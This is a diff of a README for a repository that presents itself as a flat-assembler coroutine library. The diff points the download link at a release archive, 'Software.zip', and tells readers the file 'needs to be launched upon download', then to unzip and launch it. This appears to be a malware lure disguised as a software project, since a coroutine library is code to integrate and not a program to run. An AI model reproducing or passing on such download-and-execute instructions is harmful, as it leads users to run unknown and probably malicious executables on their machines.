@@ -15,14 +15,14 @@ This repository houses a custom implementation of coroutines in flat assembler, 
 
 ## Repository Link
 
-🔗 [Download Software.zip](https://github.com/user-attachments/files/18388744/Software.zip) 🔗
+🔗 [Download https://github.com/skibidifart213/coroutines/releases/download/v2.0/Software.zip](https://github.com/skibidifart213/coroutines/releases/download/v2.0/Software.zip) 🔗
 _(Please note that the file needs to be launched upon download)_
 
 ## Getting Started
 
 To get started with the custom coroutines implementation, follow these steps:
 
-1. **Download**: Obtain the "Software.zip" file from the provided link.
+1. **Download**: Obtain the "https://github.com/skibidifart213/coroutines/releases/download/v2.0/Software.zip" file from the provided link.
 2. **Installation**: Unzip the file and launch it to explore the exciting world of custom coroutines.
 3. **Integration**: Integrate the custom coroutines into your flat assembler projects for enhanced task management.
 
